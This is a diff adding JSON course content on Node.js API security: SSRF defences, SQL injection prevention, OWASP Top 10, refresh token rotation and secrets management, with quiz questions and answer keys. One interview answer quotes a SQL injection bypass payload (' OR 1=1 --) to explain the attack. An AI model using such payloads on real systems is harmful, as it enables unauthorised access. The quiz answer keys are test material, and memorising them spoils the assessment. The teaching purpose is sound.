+          "answers": [
+            0,
+            1,
+            2,
+            4
+          ],
+          "explanation": "Allowlists, IP checks after resolution, redirect validation and network isolation all reduce SSRF. HTTPS does not prevent requests to internal hosts."
+        },
+        {
+          "id": "auth-security-08-q10",
+          "type": "fill",
+          "prompt": "Fill the blank: prepared statements with ___ queries keep user input from being interpreted as SQL.",
+          "accept": [
+            "parameterized",
+            "parameterised",
+            "parametrized",
+            "bound"
+          ],
+          "explanation": "Parameterised queries send the SQL text and values separately; the database never parses the values as SQL."
+        },
+        {
+          "id": "auth-security-08-q11",
+          "type": "interview",
+          "prompt": "Explain SQL injection and how you prevent it in a Node.js application.",
+          "answer": "- SQL injection occurs when untrusted input is concatenated into SQL, letting attackers change the query: bypass auth (' OR 1=1 --), read data (UNION SELECT), modify or delete data, sometimes run commands.\n- Prevention: parameterised queries everywhere (pg $1 placeholders, tagged-template clients, ORMs/query builders); audit raw-query escape hatches; allowlist identifiers like sort columns.\n- Validate input types and lengths at the boundary (Zod).\n- Least-privilege DB credentials, separate users for migrations, no superuser for the app.\n- Defence in depth: generic error messages (no SQL errors to clients), WAF rules, SAST tools and tests that try injection payloads.",
+          "level": "intermediate",
+          "top": true
+        },
+        {
+          "id": "auth-security-08-q12",
+          "type": "interview",
+          "prompt": "Walk me through the OWASP Top 10 and which items matter most for a Node.js API.",
+          "answer": "2025 list: Broken Access Control, Security Misconfiguration, Software Supply Chain Failures, Cryptographic Failures, Injection, Insecure Design, Authentication Failures, Software or Data Integrity Failures, Security Logging and Alerting Failures, Mishandling of Exceptional Conditions.\nFor a Node API the most relevant in practice:\n- Access control: object-level checks, tenant scoping, SSRF in URL-fetching features.\n- Supply chain: npm dependencies, install scripts, lockfiles, CI secrets, provenance.\n- Injection: parameterised SQL, NoSQL operator injection, command injection.\n- Misconfiguration: verbose errors, permissive CORS, missing headers, debug endpoints, default credentials.\n- Authentication: credential stuffing, weak JWT validation, session handling.\n- Exceptional conditions: failing open when an auth service errors, unhandled rejections leaking stack traces.",
+          "level": "advanced",
+          "top": true
+        },
+        {
+          "id": "auth-security-08-q13",
+          "type": "interview",
+          "prompt": "How would you protect a feature that fetches arbitrary user-supplied URLs (e.g. link previews)?",
+          "answer": "- Restrict schemes to http/https and ports to 80/443.\n- Resolve the hostname, reject private (10/8, 172.16/12, 192.168/16), loopback, link-local (169.254/16), CGNAT, multicast and IPv6 equivalents (::1, fc00::/7, fe80::/10, IPv4-mapped), then connect to the validated IP to avoid DNS rebinding.\n- Disable redirects or validate each hop the same way; set short timeouts and max response sizes; only parse expected content types.\n- Run the fetcher in an isolated service/network with egress firewall rules and no access to internal services or metadata (IMDSv2 required, hop limit 1).\n- Log and rate limit; cache results.",
+          "level": "advanced"
+        }
+      ],
+      "resources": [
+        {
+          "title": "OWASP Top 10:2025",
+          "url": "https://top10.owasp.org/2025/"
+        },
+        {
+          "title": "OWASP SQL Injection Prevention Cheat Sheet",
+          "url": "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html"
+        },
+        {
+          "title": "OWASP Server-Side Request Forgery Prevention Cheat Sheet",
+          "url": "https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html"
+        }
+      ]
+    },
+    {
+      "id": "auth-security-09-tokens-secrets",
+      "title": "Refresh token rotation and secrets management",
+      "level": "advanced",
+      "summary": "Design token lifecycles with rotation and reuse detection, and keep secrets out of code, logs and images.",
+      "estMinutes": 40,
+      "lesson": [
+        {
+          "heading": "Access and refresh tokens",
+          "body": "A common design: a **short-lived access token** (5 to 15 minutes, often a JWT) is sent with every API call, and a **long-lived refresh token** (days to weeks) is used only at the token endpoint to obtain new access tokens. Short access tokens bound the damage of a leak; refresh tokens keep users logged in.\n\nRefresh tokens are powerful credentials, so treat them carefully:\n\n- Make them **opaque random strings**, store only a **hash** server-side with user, device/session, expiry and family ID.\n- In browsers, keep them in an **HttpOnly, Secure, SameSite=Strict cookie scoped to the refresh path** (e.g. `Path=/auth/refresh`), or better, keep them server-side in a BFF. In mobile apps use the Keychain/Keystore.\n- Bound their lifetime with both an idle timeout and an absolute maximum session length."
+        },
+        {
+          "heading": "Rotation with reuse detection",
+          "body": "With **refresh token rotation**, every refresh returns a **new** refresh token and invalidates the old one. If an old (already used) token is ever presented again, someone has a copy: either the attacker or the legitimate client is replaying it. The server then **revokes the entire token family** (all tokens descended from that login), forcing re-authentication. This is the approach recommended for public clients by the OAuth security BCP (RFC 9700).\n\nPractical detail: concurrent refreshes from multiple tabs or flaky networks can look like reuse. Mitigate with a short grace period where the immediately previous token returns the same new token, or serialise refreshes on the client.",
+          "code": {
+            "lang": "js",
+            "source": "async function refresh(presented) {\n  const hash = sha256(presented);\n  const token = await db.refreshTokens.findByHash(hash);\n  if (!token || token.expiresAt < new Date()) throw new Unauthorized();\n\n  if (token.usedAt) {\n    // reuse of a rotated token: assume theft, kill the whole family\n    await db.refreshTokens.revokeFamily(token.familyId);\n    await audit.log(\"refresh_token_reuse\", { userId: token.userId });\n    throw new Unauthorized();\n  }\n\n  const next = crypto.randomBytes(32).toString(\"base64url\");\n  await db.transaction(async (tx) => {\n    await tx.refreshTokens.markUsed(token.id);\n    await tx.refreshTokens.insert({\n      hash: sha256(next), userId: token.userId, familyId: token.familyId,\n      expiresAt: minDate(addDays(new Date(), 14), token.familyExpiresAt), // absolute cap\n    });\n  });\n  return { accessToken: await signAccessToken(token.userId), refreshToken: next };\n}"
+          }
+        },
+        {
+          "heading": "Sender-constrained tokens",
+          "body": "Bearer tokens work for whoever holds them. **Sender-constrained** tokens bind a token to a key the client holds, so a stolen token alone is useless:\n\n- **DPoP** (RFC 9449): the client signs a proof JWT per request with its private key; the token contains the key's thumbprint.\n- **mTLS-bound tokens** (RFC 8705): the token is bound to the client certificate.\n\nThese are increasingly required in high-security profiles such as FAPI 2.0 for open banking."
+        },
+        {
+          "heading": "Secrets management",
+          "body": "Secrets include database passwords, API keys, signing keys, OAuth client secrets and webhook secrets. Principles:\n\n- **Never in source control**: not in code, not in committed `.env` files, not in Dockerfiles or image layers. Use pre-commit and CI secret scanning (gitleaks, GitHub secret scanning with push protection). If a secret is committed, **rotate it**; deleting the commit is not enough.\n- **Central secrets manager**: AWS Secrets Manager or SSM Parameter Store, GCP Secret Manager, Azure Key Vault, HashiCorp Vault, Doppler, Infisical. Inject at runtime via the platform (Kubernetes secrets with encryption at rest or the External Secrets/CSI driver), with access controlled by workload identity.\n- **Short-lived, dynamic credentials** where possible: IAM roles instead of static access keys, Vault dynamic DB credentials, OIDC federation from CI (GitHub Actions to AWS/GCP) instead of long-lived cloud keys in CI secrets.\n- **Least privilege and separation**: one secret per service and environment; production secrets inaccessible to developers by default.\n- **Rotation**: automate it, and support two valid secrets at once (old and new) so rotation needs no downtime; JWKS with multiple `kid`s does this for signing keys.\n- **Never log secrets**: configure logger redaction (pino `redact`) for authorization headers, cookies, tokens and passwords.\n\nFor encryption keys, use **envelope encryption** with a KMS: data is encrypted with a data key, and the data key is encrypted by a master key that never leaves the KMS/HSM.",
+          "code": {
+            "lang": "js",
+            "source": "import pino from \"pino\";\nexport const logger = pino({\n  redact: {\n    paths: [\"req.headers.authorization\", \"req.headers.cookie\", \"*.password\", \"*.token\", \"*.apiKey\"],\n    censor: \"[REDACTED]\",\n  },\n});"
+          }
+        }
+      ],
+      "keyPoints": [
+        "Short-lived access tokens plus long-lived, revocable refresh tokens.",
+        "Store refresh tokens hashed server-side; in browsers keep them in HttpOnly cookies or a BFF.",
+        "Rotate refresh tokens on each use; reuse of an old token revokes the whole family.",
+        "Handle concurrent refresh races with a short grace period or client-side serialisation.",
+        "DPoP and mTLS bind tokens to a client key so stolen tokens are useless.",
+        "Keep secrets out of code, images and logs; use a secrets manager, workload identity and OIDC federation.",
+        "Rotate secrets with overlap (two valid at once) and rotate immediately after any leak."
+      ],
+      "questions": [
+        {
+          "id": "auth-security-09-q01",
+          "type": "mcq",
+          "prompt": "With refresh token rotation, the server receives a refresh token that was already used. What should it do?",
+          "options": [
+            "Issue new tokens as usual",
+            "Revoke the whole token family and require re-authentication",
+            "Ignore the request",
+            "Extend the token's expiry"
+          ],
+          "answer": 1,
+          "explanation": "Reuse means a copy exists somewhere. Since the server cannot tell attacker from user, it invalidates all tokens from that login, limiting the attacker's window."
+        },
+        {
+          "id": "auth-security-09-q02",
+          "type": "mcq",
+          "prompt": "Where should a browser-based app ideally keep refresh tokens?",
+          "options": [
+            "localStorage",
+            "A JavaScript variable persisted to sessionStorage",
+            "An HttpOnly, Secure, SameSite cookie scoped to the refresh endpoint, or server-side in a BFF",
+            "In the URL"
+          ],
+          "answer": 2,
+          "explanation": "HttpOnly cookies are unreadable by scripts, and path scoping limits where they are sent. A BFF avoids exposing tokens to the browser at all."
+        },
+        {
+          "id": "auth-security-09-q03",
+          "type": "mcq",
+          "prompt": "A developer accidentally pushed an AWS access key to a public repo and force-pushed to remove it 10 minutes later. What is the correct response?",
+          "options": [
+            "Nothing, the history is rewritten",
+            "Revoke/rotate the key immediately and review its usage in CloudTrail",
+            "Make the repo private",
+            "Add the key to .gitignore"
+          ],
+          "answer": 1,
+          "explanation": "Bots scrape public commits within seconds; forks and caches keep copies. Treat the secret as compromised: rotate, investigate access, and add secret scanning with push protection."
+        },
+        {
+          "id": "auth-security-09-q04",
+          "type": "mcq",
+          "prompt": "How should a GitHub Actions workflow deploy to AWS without storing long-lived AWS keys?",
+          "options": [
+            "Hard-code keys in the workflow",
+            "Use OIDC federation so the workflow assumes an IAM role with short-lived credentials",
+            "Email the keys to the runner",
+            "Use the root account password"
+          ],
+          "answer": 1,
+          "explanation": "GitHub's OIDC provider issues a token that AWS trusts for a specific repo/branch, returning temporary credentials. Nothing long-lived needs to be stored."
+        },
+        {
+          "id": "auth-security-09-q05",
+          "type": "mcq",
+          "prompt": "What does DPoP add to OAuth access tokens?",
+          "options": [
+            "Encryption of the payload",
+            "Proof that the presenter holds the private key the token was bound to",
+            "Longer lifetimes",
+            "Automatic refresh"
+          ],
+          "answer": 1,
+          "explanation": "The client signs a per-request proof JWT with its key, and the token contains the key's thumbprint. A thief with only the token cannot create valid proofs."
+        },
+        {
+          "id": "auth-security-09-q06",
+          "type": "mcq",
+          "prompt": "How can you rotate a JWT signing key without logging everyone out?",
+          "options": [
+            "Replace the key and restart all services at once",
+            "Publish the new key alongside the old one in the JWKS (different kid), sign new tokens with the new key, and remove the old key after the longest token lifetime",
+            "Stop validating signatures during rotation",
+            "Use the same kid for both keys"
+          ],
+          "answer": 1,
+          "explanation": "Verifiers pick the key by kid. Overlapping keys let old tokens validate until they expire while new tokens use the new key."
+        },
+        {
+          "id": "auth-security-09-q07",
+          "type": "truefalse",
+          "prompt": "Storing only a hash of refresh tokens in the database means a database leak does not directly give attackers usable refresh tokens.",
+          "answer": true,
+          "explanation": "Like passwords, tokens are compared by hashing the presented value. High-entropy random tokens can use a fast hash such as SHA-256 because brute force is infeasible."
+        },
+        {
+          "id": "auth-security-09-q08",
+          "type": "truefalse",
+          "prompt": "Kubernetes Secrets are encrypted by default in etcd, so no further configuration is needed.",
+          "answer": false,
+          "explanation": "By default Kubernetes Secrets are only base64-encoded in etcd. Enable encryption at rest (ideally with a KMS provider), restrict RBAC access, or use an external secrets manager."
+        },
+        {
+          "id": "auth-security-09-q09",
+          "type": "multi",
+          "prompt": "Select all that apply: which practices reduce the risk of leaked secrets?",
+          "options": [
+            "Secret scanning with push protection",
+            "Logger redaction of auth headers and tokens",
+            "Baking production secrets into Docker images for convenience",
+            "Workload identity / IAM roles instead of static keys",
+            "Separate secrets per environment and service"
+          ],
+          "answers": [
+            0,
+            1,
+            3,
+            4
+          ],
+          "explanation": "Scanning, redaction, short-lived identity-based credentials and separation all help. Secrets in image layers are readable by anyone with the image."
+        },
+        {
+          "id": "auth-security-09-q10",
+          "type": "fill",
+          "prompt": "Fill the blank: encrypting data with a data key that is itself encrypted by a KMS master key is called ___ encryption.",
+          "accept": [
+            "envelope"
+          ],
+          "explanation": "Envelope encryption keeps the master key inside the KMS/HSM while allowing fast local encryption with data keys, and simplifies rotation."
+        },
+        {
+          "id": "auth-security-09-q11",
+          "type": "interview",
+          "prompt": "Design a token-based authentication system with access and refresh tokens. How do you handle rotation and theft?",
+          "answer": "- Login issues a short-lived access token (JWT, ~10 min, aud/iss/scope) and an opaque refresh token (random 256-bit), stored hashed with user, device, family ID, idle and absolute expiry.\n- Browser: refresh token in an HttpOnly, Secure, SameSite=Strict cookie with Path=/auth/refresh, access token in memory (or a BFF holding everything server-side). Mobile: secure storage.\n- Each refresh rotates: mark old used, issue new in the same family, keep absolute session cap.\n- Reuse detection: presenting a used token revokes the family and alerts; small grace window for concurrent refreshes.\n- Logout and password change revoke the family/all families; access token lag bounded by its TTL, with a version check for critical cases.\n- Optional: DPoP to sender-constrain tokens; signing keys rotated via JWKS with kid.",
+          "level": "advanced",
+          "top": true
+        },
+        {
+          "id": "auth-security-09-q12",
+          "type": "interview",
+          "prompt": "How do you manage secrets for a Node.js service across environments?",
+          "answer": "- Source of truth in a secrets manager (AWS Secrets Manager, Vault, GCP Secret Manager), one secret set per service and environment, access via workload identity (IAM roles for service accounts) rather than static credentials.\n- Delivery at runtime: environment variables or mounted files via External Secrets Operator/CSI driver, or the app fetches at startup and caches; never in images, repos or CI logs.\n- Validate presence at startup; redact secrets in logs and error reports.\n- CI/CD uses OIDC federation to clouds; secret scanning with push protection on repos.\n- Rotation automated with overlap windows; dynamic short-lived DB credentials where supported; audit access to secrets.\n- Locally, developers use non-production secrets via --env-file or a CLI from the secrets manager.",
+          "level": "intermediate",
+          "top": true
+        },
+        {
+          "id": "auth-security-09-q13",
+          "type": "interview",
+          "prompt": "What is the BFF (Backend for Frontend) pattern for authentication and why is it now recommended for SPAs?",
+          "answer": "The SPA never handles OAuth tokens. A small backend on the same site performs the Authorization Code + PKCE flow as a confidential client, stores access and refresh tokens server-side (session store), and issues an HttpOnly, Secure, SameSite session cookie to the browser. The SPA calls the BFF, which proxies API calls and attaches access tokens, refreshing them as needed.\nWhy: XSS cannot exfiltrate tokens (there are none in the browser), third-party cookie restrictions do not matter because everything is first-party, refresh logic is centralised, and the client can authenticate with a secret or private_key_jwt. The IETF \"OAuth 2.0 for Browser-Based Applications\" guidance lists the BFF as the most secure option. Costs: an extra hop and server-side session state; CSRF protection is needed for the cookie.",
+          "level": "advanced"
+        }
+      ],
+      "resources": [
+        {
+          "title": "OWASP Secrets Management Cheat Sheet",
+          "url": "https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html"
+        },
+        {
+          "title": "RFC 9449: OAuth 2.0 Demonstrating Proof of Possession (DPoP)",
+          "url": "https://www.rfc-editor.org/rfc/rfc9449"
+        },
+        {
+          "title": "RFC 9700: OAuth 2.0 Security Best Current Practice",
+          "url": "https://www.rfc-editor.org/rfc/rfc9700"
+        }
+      ]
+    }
+  ]
+}
